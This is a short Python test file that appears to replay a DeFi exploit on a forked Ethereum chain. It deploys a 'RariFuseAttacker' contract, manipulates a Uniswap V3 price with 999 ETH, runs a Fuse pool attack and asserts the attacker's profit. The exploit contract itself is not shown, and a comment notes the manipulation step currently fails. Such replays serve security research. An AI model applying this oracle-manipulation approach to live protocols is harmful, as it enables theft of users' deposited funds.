import pytest
from brownie import accounts

from setup_fixtures import brownie_project, eth_fork_network

@pytest.mark.fork_blocknumber(13537922)
def test_hack(eth_fork_network, brownie_project):
    attacker_eoa = accounts[0]
    attacker_start_balance = attacker_eoa.balance()

    attacker_contract = brownie_project.RariFuseAttacker.deploy({'from': attacker_eoa})

    # TODO: this currently fails
    tx = attacker_contract.manipulateUniswapV3({'from': attacker_eoa, 'value': eth_fork_network.web3.toWei(999, 'ether')})

    attacker_contract.fuseAttack({'from': attacker_eoa})

    attacker_end_balance = attacker_eoa.balance()

    profit = (attacker_end_balance-attacker_start_balance)//10**18

    print(f'profit: {profit}')

    assert profit > 0

